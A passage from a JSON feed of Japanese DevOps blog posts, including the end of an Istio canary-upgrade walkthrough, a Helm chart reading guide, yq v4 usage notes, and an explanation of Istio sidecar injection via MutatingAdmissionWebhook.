getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47※ 実は、他にもアンインストールしているものがあるのですが、話をわかりやすくするために、今回は言及していません\uD83D\uDE47\uD83C\uDFFB‍♂️05. おわりにIstioの安全なアップグレード手法の仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。Istioのアップグレードの異常がシステムに与える影響力は非常に大きく、様々な問題 (体験談：istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナを作成できない) が起こる可能性があります\uD83D\uDE07これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。 そんなわけで、","link":"https://blog.1q77.com/2023/02/line-bot-tts/","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Mosquitto で AWS IoT Core にメッセージを Publish/Subscribe する","contentSnippet":"オープンソースの MQTT メッセージブローカーである Mosquitto を使用して Mac で AWS IoT Core にメッセージを Publish/Subscribe を行う手順のメモ。https://mosquitto.org/ 準備 Mosquitto をインストールPublish/Subscribe を行うデバイスに Mosquitto をインストールします。今回は Mac を使用します。Homebrew を使用している場合は次のコマンドでインストールすることができます。$ brew install mosquittoその他のインストール方法については...","link":"https://zenn.dev/kou_pg_0131/articles/aws-iot-core-mosquitto","isoDate":"2023-02-20T10:00:32.000Z","dateMiliSeconds":1676887232000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"AWS IoT ルールで Timestream にメッセージを保存する","contentSnippet":"メッセージを Timestream に保存する IoT ルールを作成して MQTT テストクライアントで動作確認するまでの手順メモ。 手順 1. Timestream データベースを作成するTimestream データベースを作成していきます。Amazon Timestream のマネジメントコンソールで左メニューから データベース をクリックし、 データベースを作成 をクリックします。各項目を次のように入力します。項目値設定を選択標準データベース名前任意のデータベース名。今回は example とします。その他の設定は必要に応じて入...","link":"https://zenn.dev/kou_pg_0131/articles/aws-iot-rule-to-timestream","isoDate":"2023-02-20T09:32:19.000Z","dateMiliSeconds":1676885539000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Casbinのポリシーを動的・同期的にRDB管理するときの注意点","contentSnippet":"どんな記事？前回、Casbinで学ぶアクセス制御モデルRBACを書いたあとに、書き足りないなと感じていたので再度Casbinについて書いてみようかと。引き続きCasbinとGoについて、業務で得…","link":"https://qiita.com/bayobayo0324/items/1aa72baafefa2dee5147","isoDate":"2023-02-20T01:26:43.000Z","dateMiliSeconds":1676856403000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"『自由研究には向かないウェブオペレーション』というタイトルで登壇しました。","contentSnippet":"概要【今更聞けない】Linuxのしくみ - Forkwell Library #16 というイベントに『自由研究には向かないウェブオペレーション - サイト運用管理を取り巻く環境の変化 Cloud Native時代に考えるLinux オペレーション』というタイトルで登壇しました。自由研究には向かないウェブオペレーションというのは2023年において我流でウェブオペレーションをやっていく限界があるという思いがあってこのタイトルにしました。が、タイトルが仰々しすぎて資料作成にとても時間がかかりました。資料登壇資料になります。 speakerdeck.comあとがき上記では我流でウェブオペレーションをやっていく限界があると言ってました。が、自由研究には向かない殺人という小説を直近で読んでいて依頼されたのでタイトルを拝借しただけでした。ウェブオペレーションに関していうとパブリッククラウドやIaCその他諸々の文化の登場や発展により2010年よりは洗練されていて実は知識体系を構築しようと思えばいくつかの括りでできたりするんじゃないかなと思って酔っ払った勢いでまとめてみた。ができたものを朝確認すると公開する自信がなかったのでやめておきました。どこかで修正して発表したいと思います。最近のアプリケーションはクラウド上のLinuxでビルドしてクラウド上のLinux でデプロイしてクラウド上のLinuxで動かすので結局様々な知識が求められるよって話でした。あと、関係ないのですが今回の登壇のためにAWSで実現するモダンアプリケーション入門を読みました。AWSを使わなくても具体的にモダンアプリケーションのインフラを考えるのにとても良い本だったので一緒にオススメしておきます。参考資料ウェブオペレーション［試して理解］Linuxのしくみ　―実験と図解で学ぶOS、仮想マシン、コンテナの基礎知識【増補改訂版】スーパーユーザーなら知っておくべきLinuxシステムの仕組み詳解 システム・パフォーマンス 第2版オブザーバビリティ・エンジニアリングAWSで実現するモダンアプリケーション入門 〜サーバーレス、コンテナ、マイクロサービスで何ができるのか継続的デリバリーのソフトウェア工学　もっと早く、もっと良いソフトウェアを作るための秘訣チームが機能するとはどういうことか──「学習力」と「実行力」を高める実践アプローチよ心理的安全性のつくりかた","link":"https://syu-m-5151.hatenablog.com/entry/2023/02/18/201252","isoDate":"2023-02-18T11:12:52.000Z","dateMiliSeconds":1676718772000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Helm Chart の歩き方 導入前に読みたいドキュメントについて","contentSnippet":"Helm  を導入する前にChartについて読んでおいてほしいドキュメントをまとました。Chart の作成各ファイルの説明についてChart.yamlvalues.yaml.helmignoretemplate/templates/NOTES.txttemplates/_helpers.tplHelm について知るHelm Template Language の記法values.yaml へのアクセスHelm Template で利用できる関数Helm Chart で利用できる制御構文Named Templates を用いて一つのページで定義していく空白を管理する - の話Helm Chart をよくしていくHelm Chart のデバッグHelm Chart のリファクタリングHelm Chart のテストHelm Chart のリポジトリ化さいごに参考資料Chart の作成helm create でHelm Chart を作成します。Chart とは、Kubernetes リソースのまとまりを定義するファイル群のことです。helm create で構築したもの雛形はここでできます。中身を見れればなんとなく動きもわかるかもしれないので実際に手を動かしながら読んでもらえると嬉しいです。$ helm create mychartCreating mychart$ tree -a ./mychart./chart-namemychart/├── .helmignore├── Chart.yaml├── charts├── templates│\xa0\xa0 ├── NOTES.txt│\xa0\xa0 ├── _helpers.tpl│\xa0\xa0 ├── deployment.yaml│\xa0\xa0 ├── hpa.yaml│\xa0\xa0 ├── ingress.yaml│\xa0\xa0 ├── service.yaml│\xa0\xa0 ├── serviceaccount.yaml│\xa0\xa0 └── tests│\xa0\xa0     └── test-connection.yaml└── values.yamlこれにより、mychart ディレクトリが作成されます。特別なことがなければ基本的にはこれをベースに作成していくことになると思います。Helm CreateVim にもプラグイン があるので利用しているエディターごとに入れていただければと思います。各ファイルの説明について作成した mychart ディレクトリに移動して、Chart の設定を編集します。Chart.yamlChart.yaml は、作成した Chart のメタ情報を管理するファイルです。幾つかの必須パラメーターと追加のパラメーターがあります。詳細は公式のドキュメントを読んでください。Chart.yamlvalues.yamlvalues.yaml は、Helm Template Language で利用する変数の、デフォルト値を指定したファイルです。上書きしたい時は別途指定してあげます。チャート内のvalues.yamlファイルサブチャートの場合、親チャートのvalues.yamlファイルhelm install または helm upgrade に -f フラグを付けて渡した場合の values ファイル (helm install -f myvals.yaml ./mychart)set で渡される個々のパラメータ (helm install --set foo=bar ./mychart のように)Values Files.helmignoreChart をリポジトリ化する際には、作成したファイル一式を helm package コマンドを利用して tar ファイルにするのですが、.helmignore を利用すると、その tar ファイルに含めたくないファイルを指定できるようなります。The .helmignore filetemplate/templates/ はテンプレートファイル用のディレクトリです。テンプレートとして利用するファイルが納入されています。A First Templatetemplates/NOTES.txttemplates/NOTES.txt は、Chart をインストールやアップデートした時にターミナル上で表示される文言を記述できます。アクセスすべきURLやリリース結果が見れるものを記載したりしてます。{{ .Chart.Name }} や {{ .Chart.Version }} といった記述できます、これが Helm Template Language となります。Helm Template Language の記法については後述。Creating a NOTES.txt Filetemplates/_helpers.tpltemplates/\\\\_helpers.tpl は、マニフェストファイルではなく、マニフェストファイル内で利用されるグローバル変数（Helm では Named Template と呼ばれます）を定義したファイルとなります。Using \\"Partials\\" and Template IncludesHelm について知るHelm Template Language の記法コメントは # の他、{{/*...*/}}のような記法を利用できます。# を利用したコメントはデバッグモードで表示される、という違いがあります。Comments (YAML Comments vs. Template Comments)values.yaml へのアクセスBuilt-in Object とは、Helm Template Lunguage で利用できるオブジェクトというかインスタンスとなります。values.yaml 等に定義した値を取得するには、Values オブジェクト内のインスタンス変数 なになに にアクセスする、みたいな感じで利用するイメージとなります。Release のほか、Valuesや Chart といった Built-in Object を利用しています。Values は、values.yaml に定義された値へアクセスできるオブジェクトです。Chart は、Chart.yaml に定義された値へアクセスできるオブジェクトです。Built-in ObjectsHelm Template で利用できる関数Helmファイルを書いていくとこうしたいあぁしたいとなると思うのですがHelm Template Language 内では、様々な関数がビルトインされています。Helmは60以上の利用可能な関数を持っています。そのうちのいくつかは、Go Tepｍplate自体で定義されています。{{ .Release.Name | quote }} という記述があったとして、.Release.Name という値に対して、パイプを介し、 quote という引用符を付与する関数を実行しているものになります。こんな感じで、実行したい関数をパイプを介して記述していくことなります。Template Function ListHelm Chart で利用できる制御構文Helm には制御構造が利用できます。 これは、テンプレートの生成の流れを制御する機能を提供します。制御構文は、以下が用意されています。if/else for creating conditional blockswith to specify a scoperange, which provides a \\"for each\\"-style loopちなみにGo Tepｍplate自体で定義されています。Flow ControlNamed Templates を用いて一つのページで定義していく名前付きテンプレートとは、単にファイルの中で定義され、名前が付けられたテンプレートのことです。Named Template は、{{ define }} ... {{ end }} アクションで定義を行い、{{ template }} や {{ include }} アクションで、その値を利用することになります。Named Templatesちなみに{{ template }} でなく、 {{ include }} しないと、パイプを介した関数の実行できないため、{{ include }} が良い。Using the \'include\' Function空白を管理する - の話まず、テンプレート宣言の中括弧の構文を特別な文字で変更し、テンプレートエンジンに空白を切り詰めるように指示する。{{- xxx }} や {{ XX -}}とかで出てきているハイフンですが、これは Helm Template Lunguate を利用した行の空白を管理するものです。ハイフンの有無により空白の除去を実行してくれます。空白を消したあとにindentを追加するような形で利用したりもします。Helm Chart をよくしていくHelm Chart をデバッグしたりリファクタリングする時のヒントを書いていきます。Helm Chart のデバッグHelm Chart ではデバッグする方法をいくつか用意しています。Debugging Templateshelm lint は、Chart がベストプラクティスに沿っているかを確認するためのツールです。helm template --debug はローカルでChart template のレンダリングをテストします。困ったらこれでyaml を直接、確認します。helm install --dry-run --debugは、サーバーがテンプレートをレンダリングし、その結果のマニフェストファイルを返すという素晴らしい方法です。helm get manifestは、サーバーにインストールされているテンプレートを確認する良い方法です。Helm Chart のリファクタリングHelm Chart の品質をあげるためのヒントとコツをいくつか取り上げられています。テンプレートの関数を知り有用と判断すれば利用する文字列を引用する、整数を引用しない。これは絶対に頼む。1つのコマンドでリリースをインストールまたはアップグレードChart Development Tips and TricksHelm Chart のテストtemplates/tests/ ディレクトリ配下においたマニフェストファイルは、helm testコマンドにより実行することができます。Chart TestsHelm Chart のリポジトリ化リポジトリ化するには、index.yaml というファイルとChart 一式を固めた tar ファイルを静的 Web ホスティングサイトにアップロードすることで実現されます。The Chart Repository Guideさいごにこれもあれば読んでほしいという内容があれば名前付きで掲載させていただくので連絡いただきたいです。参考資料Helm Docs | Getting Started","link":"https://syu-m-5151.hatenablog.com/entry/2023/02/16/141433","isoDate":"2023-02-16T05:14:33.000Z","dateMiliSeconds":1676524473000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"運用の効率化を支える AWS Systems Manager Automation の紹介","contentSnippet":"AWS Systems Manager（SSM）では運用に役立つ機能が提供されています。 ただし、提供されている機能が多く、今まで使用した経験があるのは一部の機能に限られていましたので、どのようなことができるのか調べてみ […]The post 運用の効率化を支える AWS Systems Manager Automation の紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-ssm-automation/","isoDate":"2023-02-16T02:40:28.000Z","dateMiliSeconds":1676515228000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GitHub Actions でプライベートリポジトリを checkout する","contentSnippet":"GitHub Actions で別のプライベートリポジトリを checkout する方法のメモ。 サンプルコードこの記事で紹介するサンプルコードは以下のリポジトリで管理しています。https://github.com/koki-develop/gh-actions-checkout-private-repo-example 前置きこのドキュメントでは次の 2 通りの方法についてまとめます。Deploy keys を使う方法Personal Access Token を使う方法いずれの方法も GitHub Actions ワークフローを作成するリポジトリと chec...","link":"https://zenn.dev/kou_pg_0131/articles/gh-actions-checkout-private-repo","isoDate":"2023-02-13T09:40:56.000Z","dateMiliSeconds":1676281256000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるた","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"『ポストモーテムはじめました』というタイトルで登壇しました。","contentSnippet":"概要インシデントにどう対応してきたか？みんなで学ぶポストモーテム Lunch LT というイベントで『ポストモーテムはじめました』というタイトルで登壇しました。この登壇には元記事があって良いポストモーテムを執筆するために必要な5つのポイントです。この記事に対していくつかの加筆修正を行い資料にしました。資料登壇資料になります。 speakerdeck.comあとがきポストモーテムについて考えたり調べていくと仕組みよりも組織としての心がけが大事だと思いました。発表の性質や時間の都合上SREでの話に留めたのですが、品質管理についても言及しながらまとめていく活動もしたい。組織を作っていくなら下の2冊はとてもオススメです。心理的安全性のつくりかた　「心理的柔軟性」が困難を乗り越えるチームに変える作者:石井遼介日本能率協会マネジメントセンターAmazon失敗の科学 失敗から学習する組織、学習できない組織作者:マシュー・サイドディスカヴァー・トゥエンティワンAmazon品質管理についてはこちらを参考にしました。失敗を後悔する「恥」として捉えてはいけない。学習する機会と捉え、次に活かせば良い。そのためのスキルが品質管理。ビジュアル品質管理の基本 第5版作者:内田 治日経BPマーケティング(日本経済新聞出版Amazon登壇した御礼をいただいた。『インシデントにどう対応してきたか？みんなで学ぶポストモーテム Lunch LT』というイベント登壇の御礼品をいただけました。　#LT_findy pic.twitter.com/9ll5ig0ZjA— nwiizo (@nwiizo) 2023年2月21日  参考資料SREとはなにかhttps://sreake.com/blog/what-is-sre/良いポストモーテムを執筆するために必要な5つのポイントhttps://sreake.com/blog/5point-good-postmortem/Part III. Practiceshttps://sre.google/sre-book/part-III-practices/SRE サイトリライアビリティエンジニアリングhttps://www.oreilly.co.jp/books/9784873117911/ウェブオペレーションhttps://www.oreilly.co.jp/books/9784873114934/Postmortem Culture: Learning from Failurehttps://sre.google/sre-book/postmortem-culture/チームが機能するとはどういうことか──「学習力」と「実行力」を高める実践アプローチよりhttps://www.amazon.co.jp/dp/B00N8J1NPQ","link":"https://syu-m-5151.hatenablog.com/entry/2023/02/09/113316","isoDate":"2023-02-09T02:33:16.000Z","dateMiliSeconds":1675909996000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"GitHub Actions から ECR に Docker イメージを push する","contentSnippet":"備忘録。 サンプルコード今回紹介するサンプルコードは以下のリポジトリで管理しています。https://github.com/koki-develop/github-actions-ecr-push-example 準備 1. GitHub Actions 用の ID プロバイダと IAM ロールを作成するGitHub Actions で OIDC を使用して AWS 認証を行うために、下記ドキュメントを参考に ID プロバイダと IAM ロールを作成します。https://zenn.dev/kou_pg_0131/articles/gh-actions-oidc-aw...","link":"https://zenn.dev/kou_pg_0131/articles/gh-actions-ecr-push-image","isoDate":"2023-02-08T10:03:48.000Z","dateMiliSeconds":1675850628000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"OpenSLO とは？","contentSnippet":"はじめに OpenSLO の概要に触れながら SLO as Code の現状についてお話しします。 OpenSLOとは？ OpenSLO とは、サービスレベル目標 (SLO)、それに関連するリソースの記述形式を標準化する […]The post OpenSLO とは？ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/openslo/","isoDate":"2023-02-07T03:37:40.000Z","dateMiliSeconds":1675741060000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Docker イメージのタグ一覧を取得する docker-tags CLI の紹介","contentSnippet":"概要Docker イメージのタグ一覧を取得する docker-tags CLI を公開しました。https://github.com/koki-develop/docker-tags以下のように任意の Docker イメージのタグ一覧を取得して出力することができます。$ docker-tags alpinelatestedge3.9.63.9.53.9.4# ...# 名前付きで出力することもできる$ docker-tags alpine -nalpine:latestalpine:edgealpine:3.9.6alpine:3.9.5alpin...","link":"https://zenn.dev/kou_pg_0131/articles/docker-tags-cli-usage","isoDate":"2023-02-06T09:19:35.000Z","dateMiliSeconds":1675675175000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"GitHub Actions で GitHub の画像キャッシュをクリアする","contentSnippet":"GitHub では README などに載せた画像は Camo という画像プロキシ経由で https://camo.githubusercontent.com/... のような URL で配信されるのですが、たまにこれらの画像が長期間キャッシュされてしまうことがあります。例えば僕の GitHub Profile には Badge Generator で作成した Zenn や Qiita のバッジを表示しているのですが、これらの画像が長期間キャッシュされて正しい数値が表示されていないことがありました。GitHub Profileこれらの画像キャッシュをクリアするシェルスクリプトなど...","link":"https://zenn.dev/kou_pg_0131/articles/hub-purge-action-usage","isoDate":"2023-01-30T10:22:30.000Z","dateMiliSeconds":1675074150000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"GitHub の README はリポジトリのルートディレクトリ以外にも置ける","contentSnippet":"Twitter で以下のツイートを見かけました。https://twitter.com/azu_re/status/1614458485055586305そこで調べてみたところ、 GitHub では次の場所に置かれている README を認識するようです。.github/リポジトリのルートディレクトリdocs/複数の README が含まれている場合は、 .github/ 、ルートディレクトリ、 docs/ の順に優先されます。例えば冒頭のツイートの reduxjs/redux-toolkit は .github/ ディレクトリ内に README.md (正確には pa...","link":"https://zenn.dev/kou_pg_0131/articles/github-readme-path","isoDate":"2023-01-26T10:02:07.000Z","dateMiliSeconds":1674727327000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"【Terraform】CloudFront Functions を使用して Basic 認証を設定する","contentSnippet":"たまに必要になるのでメモ。 検証環境Terraform v1.3.7AWS Provider v4.49.0 サンプルコード今回紹介するサンプルコードは下記リポジトリで管理しています。https://github.com/koki-develop/cloudfront-basic-auth-example 準備今回は例として S3 バケットのオブジェクトを配信する CloudFront Distribution を作成します。主題ではないので気になる方のみ読んでください。サンプルコードprovider.tf# AWS Provider の設定prov...","link":"https://zenn.dev/kou_pg_0131/articles/tf-cloudfront-basicauth","isoDate":"2023-01-23T10:22:18.000Z","dateMiliSeconds":1674469338000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"aws-vault のすすめ","contentSnippet":"aws-vault とは AWS の認証情報をローカルに安全に保管する事が出来る CLI ツール GitHub Star 7K⭐ (2022-12-22現在) brew で下記のコマンドのようにインストール可能 リポジト […]The post aws-vault のすすめ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-vault/","isoDate":"2023-01-19T05:45:36.000Z","dateMiliSeconds":1674107136000,"authorName":"Sreake","authorId":"Sreake"},{"title":"yaml 管理を自動化する時の必須道具 yq(v4) の倒し方","contentSnippet":"yq とはyq はgoで書かれている軽量でポータブルなコマンドライン YAML、JSON、XML プロセッサです。yq は jq に似た構文を使用しますが、json、xml、properties、csv、tsv と同様に yaml ファイルを処理します。記事の執筆時点の2023 年01月17日時点でv4.30.8 がリリースされています。github.comyqyq のv4 はv3 とはかなり異なっています。v3 で端的に書けていたものが、v4 ではより表現力のある構文言語となった結果としてちょっと冗長になったように思えるんですけどjq っぽいので慣れてしまえばよいものだとおもいます 。mikefarah.gitbook.ioyq 使ってみる今回の目的はapplication/deployment.yaml のimageの値をnginx:1.14.2をnginx:1.23.3に書き換えたいと思います。yaml をCIで変更するなんてなんぼでもやってますからね。Path などの概念については説明を省略します。普通にシェル芸としてやっていくときには1日1問、半年以内に習得　シェル・ワンライナー160本ノックなどを参考にすると良い。apiVersion: apps/v1kind: Deploymentmetadata:  name: nginx-deploymentspec:  selector:    matchLabels:      app: nginx  replicas: 2 # tells deployment to run 2 pods matching the template  template:    metadata:      labels:        app: nginx    spec:      containers:      - name: nginx        image: nginx:1.14.2 # 書き換えたいんじゃ        ports:        - containerPort: 80yq(v4) 使ってみるyq(v4) でreadyq \'.spec.template.spec.containers[0].image\' deployment.yamlnginx:1.14.2yq(v4) でwriteyq -i \'.spec.template.spec.containers[0].image = \\"nginx:1.23.3\\"\' deployment.yaml確認します。yq \'.spec.template.spec.containers[0].image\' deployment.yamlnginx:1.23.3で目的達成しました簡単！yq(v3) との違いyq(v3) にはwriteやreadなどのサブコマンドが撤廃されたので準拠した書き方を覚える必要があると思います。mikefarah.gitbook.ioyq(v4) での変数利用yq(v4)ではstrenv(<env>)を利用することで変数を利用することができるIMAGE=nginx yq -i \'.spec.template.spec.containers[0].image = strenv(IMAGE)\' deployment.yaml確認します。yq \'.spec.template.spec.containers[0].image\' deployment.yaml nginxﾔｯﾀﾈ!!左辺にはこちら代入できないみたいなのでそのときには作成してからyq に読むこませると良いみたい(他にいい方法があれば教えてほしいです)。    YQ_INPLACE=\\".${EXE_APP}.image.tag = \\\\\\"${TAG_HASH}\\\\\\"\\"    yq -i \\"${YQ_INPLACE}\\" \\"$CHANGE_FILE\\"おわりv3 -> v4 には変更点がいくつかあります。皆さんもCIで使っている時は気をつけましょう。あとはCI で書き換えで使っている時は-vを使っておきましょう。1日1問、半年以内に習得　シェル・ワンライナー160本ノック Software Design plus作者:上田 隆一,山田 泰宏,田代 勝也,中村 壮一,今泉 光之,上杉 尚史技術評論社Amazon","link":"https://syu-m-5151.hatenablog.com/entry/2023/01/17/011521","isoDate":"2023-01-16T16:15:21.000Z","dateMiliSeconds":1673885721000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"GoReleaser で Go 製 CLI のリリースを自動化＆ Homebrew でインストールできるようにする","contentSnippet":"GoReleaser と GitHub Actions を使って Go で作った CLI のリリースを自動化して、ついでに Homebrew でインストールできるようにするまでの手順メモです。ちなみに先日、 Go で CLI を作る時に便利だったパッケージについて簡単に紹介する記事を公開しました。こちらも興味があれば見てみてください。https://zenn.dev/kou_pg_0131/articles/go-cli-packages 検証環境Go v1.19GoReleaser v1.14.1GoReleaser Action v4.1.0 GoReleas...","link":"https://zenn.dev/kou_pg_0131/articles/goreleaser-usage","isoDate":"2023-01-16T10:09:24.000Z","dateMiliSeconds":1673863764000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"【Istio⛵️】サイドカーインジェクションの仕組み","contentSnippet":"01. はじめに02. サイドカーによるサービスメッシュなぜサイドカーが必要なのかサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所【１】 Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所【２】 認証認可処理をコール【３】 アドオンの処理をコール【４】 AdmissionRequestに値を詰める【５】 AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所【６】 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバーここで説明するフロー箇所【７】 patch処理を定義【８】 AdmissionResponseに値を詰める【９】 AdmissionReviewを返信kube-apiserver ➡︎ etcdここで説明するフロー箇所【１０】 patch処理をコール【１１】 マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所【１２】 コール完了を返信以降の仕組み05. おわりに01. はじめにどーも。正月で激太りしましたが、ダイエットの予定はありません\uD83D\uDE4B\uD83C\uDFFB‍♂️今回は、サービスメッシュを実装するIstioのサイドカーインジェクションに関する記事を投稿しました\uD83D\uDE80前回の記事に引き続きIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) します本記事では、このサイドカーのインジェクションの仕組みをもりもり布教しようと思います\uD83D\uDE17 (沼のまわりに餌をまく)02. サイドカーによるサービスメッシュなぜサイドカーが必要なのかそもそも、なぜサービスメッシュでサイドカーが必要になったのでしょうか\uD83E\uDD14マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー収集、など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離できるようになります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サイドカーを使用したサービスメッシュが登場しました。↪️ 参考：サービスメッシュ、Istioがマイクロサービスのトラフィック制御、セキュリティ、可観測性に欠かせない理由：Cloud Nativeチートシート（9） - ＠ITWhat is Service Mesh and Why is it Necessary?サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。↪️ 参考：Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍♂️kube-apiserverでは、admission-controllersアドオンとして有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。↪️ 参考：Admission Controllers Reference | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetes: Burns, Brendan, Villalba, Eddie, Strebel, Dave, Evenson, Lachlan: 9781492056478: Amazon.com: Booksadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRangerMutatingAdmissionWebhook \uD83D\uDC48 これ！NamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhook↪️ 参考：Admission Controllers Reference | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。↪️ 参考：Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ 